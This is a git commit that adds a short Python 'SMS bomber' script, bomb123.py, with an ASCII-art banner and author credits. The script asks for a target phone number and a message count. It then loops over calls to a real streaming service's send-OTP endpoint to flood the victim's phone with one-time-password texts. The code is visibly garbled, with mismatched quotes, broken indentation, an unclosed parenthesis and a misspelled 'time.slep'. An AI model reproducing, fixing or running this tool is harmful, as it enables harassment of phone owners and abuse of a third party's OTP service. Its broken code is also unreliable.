bec61334a292341544dfeb9201a5134b58a093d6
Rafu0878 <112457907+Rafu0878@users.noreply.github.com>
2022-11-10 23:01:29 +0600

    Create bomb123.py

---
+++ bomb123.py
@@ -0,0 +1,29 @@
+import os
+from urllib import request
+import time
+
+os.system('clear')
+
+print('''
+___ ___  ____           ____    ____  _____  __ __
+|   |   ||    \         |    \  /    ||     ||  |  |
+| _   _ ||  D  )        |  D  )|  o  ||   __||  |  |
+|  \_/  ||    /         |    / |     ||  |_  |  |  |
+|   |   ||    \  __     |    \ |  _  ||   _] |  :  |
+|   |   ||  .  \|  |    |  .  \|  |  ||  |   |     |
+|___|___||__|\_||__|    |__|\_||__|__||__|    \__,_|
+############################################################Name: MR RAFU
+Developer: S H R
+Facebook : MD Sabbir Hossain Rafi
+					''')
+			print()
+
+			phone=input(''Enter Phone Number:'')
+			sms=int(input("SMS quantity :")
+
+url='https://www.bioscopelive.com/bn/login/send-otp?phone=+880''+phone+'&operator=bd-otp''
+
+for a in range(sms):
+	request.urlopen(url)
+	print(str(a+1)+sms send"")
+	time.slep(30)
